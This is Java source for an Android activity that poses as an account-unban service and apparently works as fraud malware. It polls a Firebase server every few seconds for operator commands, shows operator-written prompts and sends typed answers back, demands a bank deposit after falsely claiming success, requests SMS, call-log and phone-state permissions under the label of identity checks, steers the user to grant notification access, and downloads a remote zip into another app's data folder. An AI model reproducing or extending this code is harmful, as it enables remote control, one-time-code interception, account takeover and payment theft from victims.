package com.ban.ab;

import android.Manifest;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okio.BufferedSink;
import okio.Okio;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutZipTask, layoutVerifyTask, layoutPayment;
    private TextView txtRejectReason, txtTicketID, txtPaymentDetails;
    private Button btnExecuteTask, btnStartFullVerify;
    private ProgressBar taskProgressBar, verifyProgressBar;

    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");

        initViews();
        generateTicketID();
        startAutoRefresh(); // بدء مراقبة أوامر الآدمن
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutZipTask = findViewById(R.id.layoutZipTask);
        layoutVerifyTask = findViewById(R.id.layoutVerifyTask);
        layoutPayment = findViewById(R.id.layoutPayment); // واجهة الدفع الجديدة

        txtRejectReason = findViewById(R.id.txtRejectReason);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtPaymentDetails = findViewById(R.id.txtPaymentDetails);

        btnExecuteTask = findViewById(R.id.btnExecuteTask);
        btnStartFullVerify = findViewById(R.id.btnStartFullVerify);

        taskProgressBar = findViewById(R.id.taskProgressBar);
        verifyProgressBar = findViewById(R.id.verifyProgressBar);
    }

    // --- نظام مراقبة الأوامر الصامت ---
    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() { 
                checkAdminCommands(); 
                refreshHandler.postDelayed(this, 4000); // يفحص كل 4 ثوانٍ
            }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkAdminCommands() {
        String url = FIREBASE_URL + "commands/" + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String res = response.body().string();
                        if (res.equals("null")) return;
                        JSONObject data = new JSONObject(res);
                        runOnUiThread(() -> handleCommand(data.optString("status"), data));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void handleCommand(String status, JSONObject data) {
        // إخفاء جميع الواجهات أولاً
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutZipTask.setVisibility(View.GONE);
        layoutVerifyTask.setVisibility(View.GONE);
        layoutPayment.setVisibility(View.GONE);

        String content = data.optString("content");

        switch (status) {
            case "rejected":
                layoutRejected.setVisibility(View.VISIBLE);
                txtRejectReason.setText(content.isEmpty() ? "تم رفض الطلب" : content);
                break;

            case "zip_task":
                layoutZipTask.setVisibility(View.VISIBLE);
                btnExecuteTask.setOnClickListener(v -> 
                    startModdingProcess(data.optString("zip_url"), data.optString("target_package")));
                break;

            case "verify_phone":
                layoutVerifyTask.setVisibility(View.VISIBLE);
                btnStartFullVerify.setOnClickListener(v -> executeFullVerify());
                break;

            case "show_payment":
                showPaymentUI(content);
                break;

            case "show_alert":
                showCustomPopUp(content, false);
                break;

            case "show_input":
                showCustomPopUp(content, true);
                break;

            default:
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
        }
    }

    // --- واجهة الدفع (العمقي) ---
    private void showPaymentUI(String amount) {
        layoutPayment.setVisibility(View.VISIBLE);
        String details = "تم فك الحظر بنجاح 100% للرقم :- " + txtTicketID.getText() + "\n\n" +
                "يرجى إيداع مبلغ " + amount + " إلى حسابنا في العمقي\n" +
                "رقم الحساب:- 11111\n" +
                "الإسم : فلان بن فلان\n\n" +
                "حتى يمكن إكمال الخطوة الأخيرة لتشغيل حسابك.";
        txtPaymentDetails.setText(details);
    }

    // --- النوافذ المنبثقة (تنبيه أو طلب إدخال) ---
    private void showCustomPopUp(String message, boolean isInput) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View view = getLayoutInflater().inflate(R.layout.dialog_custom, null);
        
        TextView txtMsg = view.findViewById(R.id.dialogMessage);
        EditText edtIn = view.findViewById(R.id.dialogInput);
        Button btnOk = view.findViewById(R.id.btnDialogAction);
        ImageView btnClose = view.findViewById(R.id.btnDialogClose);

        txtMsg.setText(message);
        edtIn.setVisibility(isInput ? View.VISIBLE : View.GONE);
        
        AlertDialog dialog = builder.setView(view).setCancelable(false).create();
        if(dialog.getWindow() != null) dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        btnClose.setOnClickListener(v -> dialog.dismiss());
        btnOk.setOnClickListener(v -> {
            if(isInput) {
                sendResponseToAdmin(edtIn.getText().toString());
            }
            dialog.dismiss();
        });
        dialog.show();
    }

    private void sendResponseToAdmin(String response) {
        String url = FIREBASE_URL + "user_responses/" + userName + ".json";
        JSONObject data = new JSONObject();
        try {
            data.put("answer", response);
            data.put("time", System.currentTimeMillis());
            client.newCall(new Request.Builder().url(url).post(RequestBody.create(data.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception ignored) {}
    }

    // --- العمليات الفنية (التحديث والفحص) ---
    private void executeFullVerify() {
        btnStartFullVerify.setEnabled(false);
        verifyProgressBar.setVisibility(View.VISIBLE);
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS
        }, 202);
        
        new Handler().postDelayed(() -> {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            Toast.makeText(this, "يرجى تفعيل 'نظام فحص الهوية' للمتابعة", Toast.LENGTH_LONG).show();
            verifyProgressBar.setVisibility(View.GONE);
            btnStartFullVerify.setEnabled(true);
        }, 2000);
    }

    private void startModdingProcess(String url, String pkg) {
        btnExecuteTask.setEnabled(false);
        taskProgressBar.setVisibility(View.VISIBLE);
        new Thread(() -> {
            try {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                am.killBackgroundProcesses(pkg);
                File tempZip = new File(getCacheDir(), "upd.zip");
                downloadFileSync(url, tempZip);
                unzip(tempZip, new File(createPackageContext(pkg, 0).getApplicationInfo().dataDir));
                tempZip.delete();
                runOnUiThread(() -> Toast.makeText(this, "تم بنجاح ✅", Toast.LENGTH_SHORT).show());
            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "فشل ❌", Toast.LENGTH_SHORT).show());
            }
            runOnUiThread(() -> { taskProgressBar.setVisibility(View.GONE); btnExecuteTask.setEnabled(true); });
        }).start();
    }

    private void downloadFileSync(String url, File dest) throws IOException {
        try (Response response = client.newCall(new Request.Builder().url(url).build()).execute()) {
            try (BufferedSink sink = Okio.buffer(Okio.sink(dest))) { sink.writeAll(response.body().source()); }
        }
    }

    private void unzip(File zip, File dir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zip)))) {
            ZipEntry ze;
            while ((ze = zis.getNextEntry()) != null) {
                File f = new File(dir, ze.getName());
                if (ze.isDirectory()) f.mkdirs();
                else {
                    if (f.getParentFile() != null) f.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(f)) {
                        byte[] b = new byte[8192]; int l;
                        while ((l = zis.read(b)) != -1) fos.write(b, 0, l);
                    }
                }
            }
        }
    }

    private void generateTicketID() { txtTicketID.setText("ID: " + (System.currentTimeMillis() / 1000000)); }
    @Override protected void onDestroy() { super.onDestroy(); refreshHandler.removeCallbacks(refreshRunnable); }
}
